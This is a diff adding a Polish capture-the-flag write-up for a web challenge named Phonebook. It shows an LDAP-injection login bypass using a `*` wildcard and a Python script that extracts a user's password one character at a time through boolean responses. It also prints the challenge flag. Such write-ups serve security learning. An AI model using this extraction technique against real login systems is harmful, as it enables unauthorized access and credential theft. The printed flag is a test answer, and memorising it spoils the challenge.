@@ -163,3 +163,54 @@ print(decoded)
 16. Rezultat: ![image](zad4/flag4.png)
 
 <div style="page-break-after: always"></div>
+
+### 2.5 Zadanie 5
+**Nazwa:** Phonebook
+**Punkty:** 30 
+**Flaga:** HTB{d1rectory_h4xx0r_is_k00l} 
+1. Po wejściu na strone, przekierowuję nas do `/login`, gdzie ukazuję się strona logowania, widnieje również komunikat który jest podpisany nickiem: `Reese`
+2. Po analizie nagłówków widać, że załączane jest cisteczko sesji, co może się okazaćprzdydatne w późniejszym etapie. Analizując kod strony widzimy również, że przkazywany może być parameter URL o kluczu `message`.
+3. Niestety nie udało mi się odnaleźć żadnego źródła pomocna dopiero okazała się wskazówka kolegi który powiedział, że chodzi LDAP. Po wpisaniu LDAP podatności w internet czytam artykuł: https://sekurak.pl/podatnosc-ldap-injection-definicje-przyklady-ataku-metody-ochrony/, opisuję on podatność typu `LDAP Injection` bardzo przypominającą, `SQL Injection`
+4. Wpisując `*` w pole username i password, udaje się przejść na nstępną stronę, gdzie mamy dostęp do wyszukiwarki, w której niestety nie działa wildcard, ale po wpisaniu użytjkownika `Reese` otrzymujemy informację o nim - `{cn: "Kyle", homePhone: "555-1234567", mail: "reese@skynet.com", sn: "Reese"}`
+5. W artykule istnieję jeszcze opis techniki zwanej `Booleanization` która na podstawie prostych odpowiedzi od serwera typu prawda/fałsz pozwala nam odgadnąć cały ciąg znaków. To jest zamiast wpisywać samą gwiazdkę możemy wpisać `ABC*`, jeżeli `ABC` jest ciągiem początkowym hasła, ekran logowania nas przepuści, a więc idąc tym tropem chciałem sprawdzić czy w haśle użytkownika `Reese` nie znajduje się czasem flaga, skoro wiemy że flaga zawsze zaczyna się od 3 znaków `HTB`, a więc wpisuję użytkownika uzytkownik: `Reese` hasło: `HTB*` i udaje mi się zalogować co oznacza, że flaga to najprowdoboniej hasło użytkownika `Reese`
+6. Następny krok to autmatyzacja procesu, w tym celu utworzyłem skrypt w pythonie:
+```python
+import requests
+import string
+from time import sleep 
+
+# Mozliwe znaki dla hasla z wykluczeniem * poniewaz to by zawsze przechodzilo
+CHARS = list(filter(lambda x: x != '*',[ *string.punctuation ,*string.ascii_letters, "1","2","3","4","5","6","7","8","9","0"]))
+# Cel ataku
+URL = "http://206.189.121.131:31118/login"
+# Nazwa użytnikownika
+USERNAME = "Reese"
+
+#Początkowe hasło
+password = "HTB" 
+
+# Jeśli wskzane hasło jest poprawne zwracana jest wartość True w innym wypadku false
+def guess(password: str) -> bool:
+    print("trying password: " + password)
+    response = requests.post(URL,allow_redirects=False, data = {"username" : USERNAME, "password": password + "*"})
+    if 'Location' not in response.headers:
+        return False
+    if '/' != response.headers['Location']:
+        return False
+    return True
+
+# Zgaduj dopoki ostatni znak hasła nie jest równy '}' - znak końca flagi
+while password[-1] != '}':
+    for char in CHARS:
+        sleep(0.1)
+        if guess(password + char):
+            print("Found: " + char)
+            password += char 
+
+print("Password:" + password)
+```
+7. Rezultat: ![image](zad5/flag5.png)
+### 2.6 Zadanie 6
+**Nazwa:** WAFWAF
+**Punkty:** 40 
+**Flaga:**  
